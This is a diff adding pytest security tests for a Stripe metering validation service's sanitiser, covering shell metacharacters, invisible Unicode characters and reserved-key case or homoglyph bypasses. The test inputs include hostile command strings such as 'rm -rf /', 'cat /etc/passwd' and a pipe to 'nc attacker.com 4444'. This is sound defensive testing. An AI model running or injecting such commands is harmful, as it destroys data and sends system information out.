@@ -475,12 +475,13 @@ class TestSecurityEdgeCases:
         return ValidationService(config)
 
     def test_metadata_reserved_key_case_sensitivity(self, validation_service):
-        """Test that reserved key checking is case-sensitive or insensitive as designed."""
-        # If case-sensitive, "Value" should pass; if case-insensitive, it should fail
+        """Test that reserved key checking is case-insensitive after security fix."""
+        # After fix: Case-insensitive checking blocks "Value" (matches "value")
         metadata = {"Value": "test"}
-        # Current implementation is case-sensitive, so this should pass
-        result = validation_service.sanitize_metadata(metadata)
-        assert result == {"Value": "test"}
+        # Should raise error because "Value" matches reserved key "value"
+        with pytest.raises(StripeMeterValidationError) as exc_info:
+            validation_service.sanitize_metadata(metadata)
+        assert "reserved" in str(exc_info.value).lower() or "cannot be set" in str(exc_info.value).lower()
 
     def test_idempotency_component_unicode_characters(self, validation_service):
         """Test sanitization handles unicode characters."""
@@ -535,3 +536,298 @@ class TestSecurityEdgeCases:
         metadata3 = {123: "test"}  # type: ignore
         with pytest.raises(StripeMeterValidationError):
             validation_service.sanitize_metadata(metadata3)
+
+
+class TestCriticalSecurityTests:
+    """
+    CRITICAL Security Test Suite (P0) - QA Audit Findings.
+
+    Tests for CRITICAL security vulnerabilities identified in QA audit:
+    1. Missing shell metacharacter blocking (backtick, $(), ${})
+    2. Unicode bypass attempts (homoglyphs, zero-width characters)
+    3. Reserved key bypass through case variations
+
+    These tests represent CRITICAL security gaps that MUST be addressed
+    to prevent production vulnerabilities.
+    """
+
+    @pytest.fixture
+    def validation_service(self):
+        """Fixture for ValidationService instance."""
+        from src.services.stripe.validation import ValidationService
+        config = StripeConfig()
+        return ValidationService(config)
+
+    # ========== SHELL METACHARACTER BLOCKING TESTS ==========
+
+    def test_sanitize_idempotency_backtick_command_substitution(self, validation_service):
+        """
+        CRITICAL: Test backtick command substitution blocking.
+
+        Backticks (`) allow command substitution in shell:
+        `whoami` executes the command and substitutes output.
+
+        Attack example: tenant`whoami` could expose system information.
+        """
+        result = validation_service.sanitize_idempotency_component("tenant`whoami`")
+        # CRITICAL: Backtick MUST be removed
+        assert "`" not in result, "CRITICAL: Backtick command substitution NOT blocked!"
+        assert "whoami" not in result or result == "sanitized", \
+            "CRITICAL: Command payload still present after sanitization!"
+
+    def test_sanitize_idempotency_dollar_parentheses_command_substitution(self, validation_service):
+        """
+        CRITICAL: Test $() command substitution blocking.
+
+        $(command) is the modern POSIX command substitution syntax.
+
+        Attack example: tenant$(whoami) executes whoami and substitutes output.
+        """
+        result = validation_service.sanitize_idempotency_component("tenant$(whoami)")
+        # CRITICAL: Both $ and ( must be removed
+        assert "$(" not in result, "CRITICAL: $() command substitution NOT blocked!"
+        assert "whoami" not in result or result == "sanitized", \
+            "CRITICAL: Command payload still present after sanitization!"
+
+    def test_sanitize_idempotency_dollar_braces_variable_expansion(self, validation_service):
+        """
+        CRITICAL: Test ${} variable expansion blocking.
+
+        ${VAR} is variable expansion syntax that can expose environment variables.
+
+        Attack example: tenant${PATH} exposes system PATH.
+        """
+        result = validation_service.sanitize_idempotency_component("tenant${PATH}")
+        # CRITICAL: ${ must be removed
+        assert "${" not in result, "CRITICAL: ${} variable expansion NOT blocked!"
+        assert "PATH" not in result or result == "sanitized", \
+            "CRITICAL: Variable name still present after sanitization!"
+
+    def test_sanitize_idempotency_backtick_with_malicious_command(self, validation_service):
+        """
+        CRITICAL: Test backtick with actual malicious command.
+
+        Tests realistic attack scenario with backtick command substitution.
+        """
+        result = validation_service.sanitize_idempotency_component("id_`cat /etc/passwd`")
+        assert "`" not in result, "CRITICAL: Backtick NOT blocked in malicious command!"
+        # Command payload should be removed or rendered harmless
+        assert "cat" not in result or result == "sanitized"
+
+    def test_sanitize_idempotency_nested_command_substitution(self, validation_service):
+        """
+        CRITICAL: Test nested command substitution attempts.
+
+        Attackers may nest command substitutions to bypass filters.
+        """
+        result = validation_service.sanitize_idempotency_component("tenant$($(whoami))")
+        assert "$(" not in result, "CRITICAL: Nested command substitution NOT blocked!"
+        assert "whoami" not in result or result == "sanitized"
+
+    def test_sanitize_idempotency_backtick_and_dollar_combination(self, validation_service):
+        """
+        CRITICAL: Test combination of backtick and $() in same string.
+
+        Tests that multiple command substitution methods are both blocked.
+        """
+        result = validation_service.sanitize_idempotency_component("`id`$(whoami)")
+        assert "`" not in result, "CRITICAL: Backtick NOT blocked!"
+        assert "$(" not in result, "CRITICAL: $() NOT blocked!"
+
+    def test_sanitize_idempotency_pipe_to_backtick(self, validation_service):
+        """
+        CRITICAL: Test pipe command chained with backtick.
+
+        Tests command chaining with multiple shell operators.
+        """
+        result = validation_service.sanitize_idempotency_component("tenant|`rm -rf /`")
+        assert "|" not in result, "CRITICAL: Pipe operator NOT blocked!"
+        assert "`" not in result, "CRITICAL: Backtick NOT blocked!"
+
+    # ========== UNICODE BYPASS ATTEMPT TESTS ==========
+
+    def test_sanitize_idempotency_unicode_right_to_left_override(self, validation_service):
+        """
+        CRITICAL: Test Unicode right-to-left override (U+202E) bypass.
+
+        U+202E (RIGHT-TO-LEFT OVERRIDE) can visually hide malicious text.
+        This is a Unicode homoglyph attack that can bypass visual inspection.
+
+        Attack example: "tenant‮malicious" displays as "tenantsecilaim"
+        """
+        result = validation_service.sanitize_idempotency_component("tenant\u202e123")
+        # CRITICAL: RTL override should be removed or sanitized
+        assert "\u202e" not in result, "CRITICAL: Unicode RTL override NOT blocked!"
+        # Result should be safe
+        assert result == "tenant123" or result == "sanitized"
+
+    def test_sanitize_idempotency_unicode_zero_width_space(self, validation_service):
+        """
+        CRITICAL: Test zero-width space (U+200B) bypass.
+
+        Zero-width characters can be used to:
+        - Bypass string comparison checks
+        - Hide malicious payloads
+        - Create visually identical but different strings
+
+        Attack example: "tenant\u200Bvalue" vs "tenantvalue" look same
+        """
+        result = validation_service.sanitize_idempotency_component("tenant\u200b123")
+        # CRITICAL: Zero-width space must be removed
+        assert "\u200b" not in result.lower(), "CRITICAL: Zero-width space NOT blocked!"
+        assert "\u200B" not in result, "CRITICAL: Zero-width space NOT blocked!"
+
+    def test_sanitize_idempotency_unicode_zero_width_non_joiner(self, validation_service):
+        """
+        CRITICAL: Test zero-width non-joiner (U+200C) bypass.
+
+        Zero-width non-joiner can break string matching and create collisions.
+        """
+        result = validation_service.sanitize_idempotency_component("tenant\u200c123")
+        assert "\u200c" not in result.lower(), "CRITICAL: Zero-width non-joiner NOT blocked!"
+        assert "\u200C" not in result, "CRITICAL: Zero-width non-joiner NOT blocked!"
+
+    def test_sanitize_idempotency_unicode_zero_width_joiner(self, validation_service):
+        """
+        CRITICAL: Test zero-width joiner (U+200D) bypass.
+
+        Zero-width joiner can bypass validation filters and create
+        visually identical strings.
+        """
+        result = validation_service.sanitize_idempotency_component("tenant\u200d123")
+        assert "\u200d" not in result.lower(), "CRITICAL: Zero-width joiner NOT blocked!"
+        assert "\u200D" not in result, "CRITICAL: Zero-width joiner NOT blocked!"
+
+    def test_sanitize_idempotency_unicode_invisible_separator(self, validation_service):
+        """
+        CRITICAL: Test invisible separator (U+2063) bypass.
+
+        Invisible separators can create string collision attacks.
+        """
+        result = validation_service.sanitize_idempotency_component("tenant\u2063123")
+        assert "\u2063" not in result, "CRITICAL: Invisible separator NOT blocked!"
+
+    def test_sanitize_idempotency_unicode_homoglyph_attack(self, validation_service):
+        """
+        CRITICAL: Test Unicode homoglyph attack (lookalike characters).
+
+        Attackers can use visually similar characters from different scripts:
+        - Cyrillic 'а' (U+0430) vs Latin 'a' (U+0061)
+        - Greek 'ο' (U+03BF) vs Latin 'o' (U+006F)
+
+        This can bypass filters while looking like legitimate text.
+        """
+        # Cyrillic small letter a (looks like Latin 'a')
+        result = validation_service.sanitize_idempotency_component("ten\u0430nt")  # Cyrillic 'а'
+        # Should handle without crashing and produce safe output
+        assert len(result) > 0
+        # Result should not contain control characters
+        assert all(ord(c) >= 32 or c == '_' for c in result)
+
+    def test_sanitize_idempotency_unicode_multiple_zero_width(self, validation_service):
+        """
+        CRITICAL: Test multiple zero-width characters in sequence.
+
+        Tests that multiple invisible characters are all removed.
+        """
+        result = validation_service.sanitize_idempotency_component("tenant\u200b\u200c\u200d123")
+        assert "\u200b" not in result.lower()
+        assert "\u200c" not in result.lower()
+        assert "\u200d" not in result.lower()
+
+    # ========== RESERVED KEY BYPASS TESTS ==========
+
+    def test_metadata_reserved_key_uppercase_value(self, validation_service):
+        """
+        CRITICAL: Test reserved key bypass with uppercase 'VALUE'.
+
+        After fix: Case-insensitive checking prevents 'VALUE' from bypassing
+        the 'value' reserved key check.
+
+        Expected: Should be blocked (case-insensitive check implemented)
+        """
+        metadata = {"VALUE": "malicious"}
+        # After fix: This should raise StripeMeterValidationError
+        with pytest.raises(StripeMeterValidationError) as exc_info:
+            validation_service.sanitize_metadata(metadata)
+        # Verify the error message mentions the key is reserved
+        assert "reserved" in str(exc_info.value).lower() or "cannot be set" in str(exc_info.value).lower()
+        assert "VALUE" in str(exc_info.value)
+
+    def test_metadata_reserved_key_mixed_case_variations(self, validation_service):
+        """
+        CRITICAL: Test reserved key bypass with mixed case variations.
+
+        After fix: All case variations should be blocked.
+        """
+        variations = [
+            "Value",       # Title case
+            "VALUE",       # Uppercase
+            "VaLuE",       # Mixed case
+            "BaTcH_Id",    # Underscore variation
+            "BATCH_ID",    # Uppercase with underscore
+            "Stripe_Customer_Id",  # Mixed case with underscores
+        ]
+
+        for key in variations:
+            metadata = {key: "test"}
+            # After fix: All variations should be blocked
+            with pytest.raises(StripeMeterValidationError) as exc_info:
+                validation_service.sanitize_metadata(metadata)
+            # Verify the key name is in the error message
+            assert key in str(exc_info.value), f"Key '{key}' not found in error: {exc_info.value}"
+
+    def test_metadata_reserved_key_unicode_spoofing(self, validation_service):
+        """
+        CRITICAL: Test reserved key bypass with Unicode homoglyphs.
+
+        Uses visually identical Unicode characters to bypass reserved key checks.
+        Example: 'valu\u0435' (Cyrillic 'е') vs 'value' (Latin 'e')
+        """
+        # Cyrillic small letter e (U+0435) looks like Latin 'e'
+        metadata = {"valu\u0435": "malicious"}  # 'valuе' with Cyrillic 'е'
+
+        # SECURITY: This currently bypasses reserved key check
+        # The homoglyph makes it visually identical but technically different
+        result = validation_service.sanitize_metadata(metadata)
+        # Current implementation allows this (VULNERABILITY)
+        # Ideally should detect and block homoglyph attacks
+
+    def test_metadata_reserved_key_with_zero_width(self, validation_service):
+        """
+        CRITICAL: Test reserved key bypass with zero-width characters.
+
+        Zero-width characters can bypass exact string matching while
+        appearing identical to the reserved key.
+        """
+        # 'value' with zero-width space in the middle
+        metadata = {"val\u200bue": "malicious"}
+
+        # SECURITY: This bypasses exact string match
+        result = validation_service.sanitize_metadata(metadata)
+        # Current implementation allows this (VULNERABILITY)
+        # Ideally should normalize Unicode and detect zero-width chars
+
+    def test_idempotency_shell_character_sequence_attacks(self, validation_service):
+        """
+        CRITICAL: Test complex shell character sequence attacks.
+
+        Tests combinations of shell metacharacters that could be used
+        in sophisticated injection attacks.
+        """
+        attack_strings = [
+            "id`;rm -rf /;#",
+            "id$(cat /etc/passwd)",
+            "id${HOME}",
+            "id`whoami`|nc attacker.com 4444",
+            "id;export X=123",
+        ]
+
+        for attack in attack_strings:
+            result = validation_service.sanitize_idempotency_component(attack)
+            # Must remove all dangerous metacharacters
+            assert "`" not in result, f"Backtick not blocked in: {attack}"
+            assert "$(" not in result, f"$() not blocked in: {attack}"
+            assert "${" not in result, f"${{ not blocked in: {attack}"
+            assert ";" not in result, f"Semicolon not blocked in: {attack}"
+            assert "|" not in result, f"Pipe not blocked in: {attack}"
